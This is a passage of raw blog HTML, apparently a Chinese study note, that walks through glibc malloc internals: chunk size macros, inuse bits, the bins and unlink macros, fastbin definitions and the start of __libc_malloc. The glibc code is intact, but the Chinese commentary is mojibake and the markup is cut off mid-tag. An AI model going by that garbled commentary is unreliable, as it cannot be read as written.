class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">/* The corresponding bit mask value */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> request2size(req)                                         \</span><br><span class="hljs-meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span><br><span class="hljs-meta">   MINSIZE :                                                      \</span><br><span class="hljs-meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> checked_request2size(req, sz)                             \</span><br><span class="hljs-meta">  <span class="hljs-keyword">if</span> (REQUEST_OUT_OF_RANGE (req)) &#123;      \</span><br><span class="hljs-meta">      __set_errno (ENOMEM);      \</span><br><span class="hljs-meta">      return 0;      \</span><br><span class="hljs-meta">    &#125;      \</span><br><span class="hljs-meta">  (sz) = request2size (req);</span><br></code></pre></td></tr></table></figure><p>é‡ç‚¹è§£é‡Šä¸€ä¸‹request2size(req)</p><ul><li>å½“req&lt;MINSIZE-MALLOC_ALIGN_MASK-SIZE_SZ(0x9)æ—¶ï¼Œè¿”å›0x20ï¼ˆæ»¡è¶³pre_size+size+fd+bkæ‰€éœ€å¤§å°ï¼‰</li><li>req&#x3D;n(0x10)+0x8æ—¶ï¼ˆn&gt;0ï¼‰ï¼Œè¿”å›(n+1)(0x10)ï¼Œchunkæœ¬èº«çš„dataéƒ¨åˆ†n(0x10)ï¼Œnextchunkçš„pre_size0x10ä¹Ÿç”¨ä½œdata</li><li>req&#x3D;n(0x10)æ—¶ï¼ˆn&gt;0ï¼‰ï¼Œè¿”å›(n+1)(0x10)ï¼Œdataä¸ºn(0x10)</li><li>checked_request2sizeæ¯”request2sizeå¤šä¸€æ­¥æ£€æŸ¥æ•°æ®èŒƒå›´ï¼Œæ›´å®‰å…¨</li></ul><h2 id="chunkç›¸å…³æ©ç æ“ä½œ"><a href="#chunkç›¸å…³æ©ç æ“ä½œ" class="headerlink" title="chunkç›¸å…³æ©ç æ“ä½œ"></a>chunkç›¸å…³æ©ç æ“ä½œ</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* size field is or&#x27;ed with PREV_INUSE when previous adjacent chunk in use */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREV_INUSE 0x1</span><br><br><span class="hljs-comment">/* extract inuse bit of previous chunk */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prev_inuse(p)       ((p)-&gt;size &amp; PREV_INUSE)</span><br><br><br><span class="hljs-comment">/* size field is or&#x27;ed with IS_MMAPPED if the chunk was obtained with mmap() */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IS_MMAPPED 0x2</span><br><br><span class="hljs-comment">/* check for mmap()&#x27;ed chunk */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;size &amp; IS_MMAPPED)</span><br><br><br><span class="hljs-comment">/* size field is or&#x27;ed with NON_MAIN_ARENA if the chunk was obtained</span><br><span class="hljs-comment">   from a non-main arena.  This is only set immediately before handing</span><br><span class="hljs-comment">   the chunk to the user, if necessary.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NON_MAIN_ARENA 0x4</span><br><br><span class="hljs-comment">/* check for chunk from non-main arena */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunk_non_main_arena(p) ((p)-&gt;size &amp; NON_MAIN_ARENA)</span><br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Bits to mask off when extracting size</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   Note: IS_MMAPPED is intentionally not masked off from size field in</span><br><span class="hljs-comment">   macros for which mmapped chunks should never be seen. This should</span><br><span class="hljs-comment">   cause helpful core dumps to occur if it is tried by accident by</span><br><span class="hljs-comment">   people extending or adapting this malloc.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br><br><span class="hljs-comment">/* Get size, ignoring use bits */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunksize(p)         ((p)-&gt;size &amp; ~(SIZE_BITS))</span><br><br><br><span class="hljs-comment">/* Ptr to next physical malloc_chunk. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> next_chunk(p) ((mchunkptr) (((char *) (p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))</span><br><br><span class="hljs-comment">/* Ptr to previous physical malloc_chunk */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prev_chunk(p) ((mchunkptr) (((char *) (p)) - ((p)-&gt;prev_size)))</span><br><br><span class="hljs-comment">/* Treat space at ptr + offset as a chunk */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span><br><br><span class="hljs-comment">/* extract p&#x27;s inuse bit */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> inuse(p)      \</span><br><span class="hljs-meta">  ((((mchunkptr) (((char *) (p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))-&gt;size) &amp; PREV_INUSE)</span><br><br><span class="hljs-comment">/* set/clear chunk as being inuse without otherwise disturbing */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_inuse(p)      \</span><br><span class="hljs-meta">  ((mchunkptr) (((char *) (p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))-&gt;size |= PREV_INUSE</span><br><span class="hljs-comment">//chunkçš„ä½¿ç”¨çŠ¶æ€æ˜¯ç”±nextchunkçš„pre_inuseä½åˆ¤æ–­çš„</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> clear_inuse(p)      \</span><br><span class="hljs-meta">  ((mchunkptr) (((char *) (p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))-&gt;size &amp;= ~(PREV_INUSE)</span><br><br><br><span class="hljs-comment">/* check/set/clear inuse bits in known places */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> inuse_bit_at_offset(p, s)      \</span><br><span class="hljs-meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;size &amp; PREV_INUSE)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_inuse_bit_at_offset(p, s)      \</span><br><span class="hljs-meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;size |= PREV_INUSE)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> clear_inuse_bit_at_offset(p, s)      \</span><br><span class="hljs-meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;size &amp;= ~(PREV_INUSE))</span><br><br><br><span class="hljs-comment">/* Set size at head, without disturbing its use bit */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_head_size(p, s)  ((p)-&gt;size = (((p)-&gt;size &amp; SIZE_BITS) | (s)))</span><br><br><span class="hljs-comment">/* Set size/use field */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_head(p, s)       ((p)-&gt;size = (s))</span><br><br><span class="hljs-comment">/* Set size at footer (only when chunk is not in use) */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))-&gt;prev_size = (s))</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„ï¼š</p><ul><li>chunkå¤§éƒ¨åˆ†æ“ä½œéƒ½å¯ä»¥â€œé¡¾åæ€ä¹‰â€</li><li>ä»¥ä¸Šæºç å¯ä»¥ä½“ç°chunkçš„å¯»å€æ˜¯ç”±pre_sizeå’Œsizeå†³å®šçš„</li></ul><h2 id="binsç›¸å…³æºç "><a href="#binsç›¸å…³æºç " class="headerlink" title="binsç›¸å…³æºç "></a>binsç›¸å…³æºç </h2><h3 id="binsé€šç”¨å®å®šä¹‰"><a href="#binsé€šç”¨å®å®šä¹‰" class="headerlink" title="binsé€šç”¨å®å®šä¹‰"></a>binsé€šç”¨å®å®šä¹‰</h3><p>binséƒ¨åˆ†æ€»æ³¨é‡Šç•¥ï¼Œå¤§æ„ï¼š</p><ul><li>binsä¸­å…±æœ‰128ä¸ªbiné“¾ï¼Œbiné“¾ä¸ºåŒé“¾è¡¨</li><li>biné“¾æŒ‰æ‰€å«chunkçš„èŒƒå›´å¤§å°æ’å¸ƒ</li><li>ä¸€æ¡biné“¾ä¸­çš„chunkéµå¾ªFIFOåŸåˆ™</li><li>ï¼binsæ•°ç»„å…ƒç´ è¢«çœ‹ä½œchunkçš„bkå’Œfdï¼Œè¿™ä¸ªæ€ç»´åœ¨æºç ç†è§£æ—¶éå¸¸é‡è¦<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> *<span class="hljs-title">mbinptr</span>;</span><br><br><span class="hljs-comment">/* addressing -- note that bin_at(0) does not exist */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> bin_at(m, i) \</span><br><span class="hljs-meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))      \</span><br><span class="hljs-meta">             - offsetof (struct malloc_chunk, fd))</span><br><span class="hljs-comment">//å®šä¹‰ä¸­ä¸å­˜åœ¨bin 0ï¼Œbin 1ä¸ºunsorted binï¼ˆæ‰€ä»¥-1ï¼‰ï¼Œä¸€ä¸ªbinå ç”¨binsçš„ä¸¤ä¸ªå…ƒç´ ï¼ˆæ‰€ä»¥*2ï¼‰</span><br><span class="hljs-comment">//binsæ•°ç»„å…ƒç´ è¢«çœ‹ä½œchunkçš„fdå’Œbkï¼ˆæ‰€ä»¥å‡å»fdæˆå‘˜åœ¨ç»“æ„ä½“malloc_chunkä¸­çš„åç§»ï¼‰</span><br><br><span class="hljs-comment">/* analog of ++bin */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> next_bin(b)  ((mbinptr) ((char *) (b) + (sizeof (mchunkptr) &lt;&lt; 1)))</span><br><br><span class="hljs-comment">/* Reminders about list directionality within bins */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> first(b)     ((b)-&gt;fd)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> last(b)      ((b)-&gt;bk)</span><br><span class="hljs-comment">//biné“¾ä¸­çš„ç¬¬ä¸€ä¸ªchunkç”±binçš„fdå†³å®šï¼Œæœ€åä¸€ä¸ªchunkç”±bkå†³å®š</span><br><br><span class="hljs-comment">/* Take a chunk off a bin list */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span><br><span class="hljs-meta">    FD = P-&gt;fd;      \</span><br><span class="hljs-meta">    BK = P-&gt;bk;      \</span><br><span class="hljs-meta">    <span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))      \</span><br><span class="hljs-meta">      malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="hljs-meta">    <span class="hljs-keyword">else</span> &#123;      \</span><br><span class="hljs-meta">        FD-&gt;bk = BK;      \</span><br><span class="hljs-meta">        BK-&gt;fd = FD;      \</span><br><span class="hljs-meta">        <span class="hljs-keyword">if</span> (!in_smallbin_range (P-&gt;size)      \</span><br><span class="hljs-meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;      \</span><br><span class="hljs-meta">    <span class="hljs-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)      \</span><br><span class="hljs-meta">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span><br><span class="hljs-meta">      malloc_printerr (check_action,      \</span><br><span class="hljs-meta">       <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="hljs-meta">       P, AV);      \</span><br><span class="hljs-meta">            <span class="hljs-keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;      \</span><br><span class="hljs-meta">                <span class="hljs-keyword">if</span> (P-&gt;fd_nextsize == P)      \</span><br><span class="hljs-meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      \</span><br><span class="hljs-meta">                <span class="hljs-keyword">else</span> &#123;      \</span><br><span class="hljs-meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span><br><span class="hljs-meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span><br><span class="hljs-meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      \</span><br><span class="hljs-meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      \</span><br><span class="hljs-meta">                  &#125;      \</span><br><span class="hljs-meta">              &#125; <span class="hljs-keyword">else</span> &#123;      \</span><br><span class="hljs-meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span><br><span class="hljs-meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span><br><span class="hljs-meta">              &#125;      \</span><br><span class="hljs-meta">          &#125;      \</span><br><span class="hljs-meta">      &#125;      \</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-comment">//ä»biné“¾ä¸­æ‘˜é™¤chunk Pï¼Œç›¸å…³è§£é‡Šè§unsafe_unlink</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="chunkåœ¨binsä¸­å®šå€ç›¸å…³å®å®šä¹‰"><a href="#chunkåœ¨binsä¸­å®šå€ç›¸å…³å®å®šä¹‰" class="headerlink" title="chunkåœ¨binsä¸­å®šå€ç›¸å…³å®å®šä¹‰"></a>chunkåœ¨binsä¸­å®šå€ç›¸å…³å®å®šä¹‰</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NBINS             128</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NSMALLBINS         64</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> in_smallbin_range(sz)  \</span><br><span class="hljs-meta">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span><br><span class="hljs-comment">//sz&lt;0x3f0</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> smallbin_index(sz) \</span><br><span class="hljs-meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span><br><span class="hljs-meta">   + SMALLBIN_CORRECTION)</span><br><span class="hljs-comment">//å¾ˆå¤šä¿è¯å…¼å®¹æ€§çš„æ“ä½œ</span><br><span class="hljs-comment">//small binä»2åˆ°63å…±62ä¸ª</span><br><span class="hljs-comment">//64ä½ï¼šæ¯ä¸ªsmall binçš„å¤§å°éƒ½æ˜¯2*SIZE_SZ*idxï¼ˆbinsæ•°ç»„ä¸‹æ ‡ï¼‰</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> largebin_index(sz) \</span><br><span class="hljs-meta">  (SIZE_SZ == 8 ? largebin_index_64 (sz)                                     \</span><br><span class="hljs-meta">   : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz)                     \</span><br><span class="hljs-meta">   : largebin_index_32 (sz))</span><br><span class="hljs-comment">//è¿˜æ˜¯ä¿è¯å…¼å®¹æ€§çš„æ“ä½œï¼ŒSIZE_SZ==8ï¼ˆ64ä½ï¼‰æ‰§è¡Œlargebin_index_64ç‰ˆæœ¬çš„å¯»å€å®</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> largebin_index_64(sz)                                                \</span><br><span class="hljs-meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="hljs-string">&lt;= 48) ?  48 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="hljs-string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="hljs-string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="hljs-string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="hljs-string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span><br><span class="hljs-meta">   126)</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">    æ•°é‡            binä¸­chunkä¹‹é—´çš„å…¬å·®</span><br><span class="hljs-comment">    64 bins of size       8 small bin</span><br><span class="hljs-comment">    32 bins of size      64</span><br><span class="hljs-comment">    16 bins of size     512</span><br><span class="hljs-comment">     8 bins of size    4096</span><br><span class="hljs-comment">     4 bins of size   32768</span><br><span class="hljs-comment">     2 bins of size  262144 large bin</span><br><span class="hljs-comment">     1 bin  of size what&#x27;s left</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">ç¬¬1ä¸ªlarge biné“¾ä¸­çš„chunkå¤§å°ä¸º[1024,1024+64)</span><br><span class="hljs-comment">ç¬¬2ä¸ªlarge biné“¾ä¸­çš„chunkå¤§å°ä¸º[1024+64,1024+128)</span><br><span class="hljs-comment">â€¦â€¦</span><br><span class="hljs-comment">ç¬¬33ä¸ªlarge biné“¾ä¸­çš„chunkå¤§å°ä¸º[xxxx,xxxx+512)</span><br><span class="hljs-comment">ä»¥æ­¤ç±»æ¨</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> bin_index(sz) \</span><br><span class="hljs-meta">  ((in_smallbin_range (sz)) ? smallbin_index (sz) : largebin_index (sz))</span><br></code></pre></td></tr></table></figure><h3 id="unsorted-binã€top-chunkå’Œbinmap"><a href="#unsorted-binã€top-chunkå’Œbinmap" class="headerlink" title="unsorted binã€top chunkå’Œbinmap"></a>unsorted binã€top chunkå’Œbinmap</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//unsorted chunks</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> unsorted_chunks(M)          (bin_at (M, 1))</span><br><br><span class="hljs-comment">//top</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> initial_top(M)              (unsorted_chunks (M))</span><br><br><span class="hljs-comment">//binmap</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BINMAPSHIFT      5</span><br><span class="hljs-comment">//128ä¸ªbinï¼Œä¸€ä¸ªbinç”¨1bitè¡¨ç¤ºï¼Œæ¯ä¸ªbinmapå…ƒç´ å­˜32bit</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BITSPERMAP       (1U &lt;&lt; BINMAPSHIFT)</span><br><span class="hljs-comment">//32ï¼Œ&lt;&lt;çš„å‚æ•°æ˜¯å³è¾¹é‚£ä¸ª(Ë‰â–½Ë‰ï¼›)...</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BINMAPSIZE       (NBINS / BITSPERMAP)</span><br><span class="hljs-comment">//binmapæ•°ç»„å¤§å°</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> idx2block(i)     ((i) &gt;&gt; BINMAPSHIFT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> idx2bit(i)       ((1U &lt;&lt; ((i) &amp; ((1U &lt;&lt; BINMAPSHIFT) - 1))))</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> unmark_bin(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp;= ~(idx2bit (i)))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> get_binmap(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp; idx2bit (i))</span><br></code></pre></td></tr></table></figure><h3 id="fastbinç›¸å…³å®å®šä¹‰"><a href="#fastbinç›¸å…³å®å®šä¹‰" class="headerlink" title="fastbinç›¸å…³å®å®šä¹‰"></a>fastbinç›¸å…³å®å®šä¹‰</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> *<span class="hljs-title">mfastbinptr</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</span><br><br><span class="hljs-comment">/* offset 2 to use otherwise unindexable first 2 bins */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> fastbin_index(sz) \</span><br><span class="hljs-meta">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span><br><br><span class="hljs-comment">/* The maximum fastbin request size we support */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_FAST_SIZE     (80 * SIZE_SZ / 4)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NFASTBINS  (fastbin_index (request2size (MAX_FAST_SIZE)) + 1)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL)</span><br><span class="hljs-comment">//å½“åˆå¹¶chunk&gt;FASTBIN_CONSOLIDATION_THRESHOLDæ—¶</span><br><span class="hljs-comment">//è§¦å‘malloc_consolidate()å‡½æ•°åˆå¹¶fastbinä¸­çš„chunk</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_max_fast(s) \</span><br><span class="hljs-meta">  global_max_fast = (((s) == 0)      \</span><br><span class="hljs-meta">                     ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> get_max_fast() global_max_fast</span><br></code></pre></td></tr></table></figure><h1 id="ç›¸å…³å‡½æ•°"><a href="#ç›¸å…³å‡½æ•°" class="headerlink" title="ç›¸å…³å‡½æ•°"></a>ç›¸å…³å‡½æ•°</h1><h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h2><h3 id="libc-mallocæºç "><a href="#libc-mallocæºç " class="headerlink" title="__libc_mallocæºç "></a>__libc_mallocæºç </h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<br>__libc_malloc (<span class="hljs-type">size_t</span> bytes)<br>&#123;<br>  mstate ar_ptr;<br>  <span class="hljs-type">void</span> *victim;<br><br>  <span class="hljs-type">void</span> *(*hook) (<span class="hljs-type">size_t</span>, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__malloc_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br><span 